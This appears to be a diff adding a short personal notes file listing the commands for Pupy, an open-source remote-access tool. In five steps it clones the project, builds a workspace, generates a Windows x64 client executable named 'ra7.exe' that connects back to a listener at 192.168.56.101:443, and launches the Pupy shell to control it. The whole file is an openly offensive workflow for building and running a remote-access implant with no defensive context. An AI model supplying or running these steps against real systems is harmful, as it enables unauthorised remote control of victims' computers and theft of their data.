@@ -1,0 +1,7 @@
+Pupy Commands - https://github.com/n1nj4sec/pupy
+
+1) git clone --recursive https://github.com/n1nj4sec/pupy
+2) cd pupy
+3) python create-workspace.py -DG pupyw
+4) ./pupyw/bin/pupygen -f client -O windows -A x64 -o ra7.exe connect --host 192.168.56.101:443
+5) ./pupyw/bin/pupysh
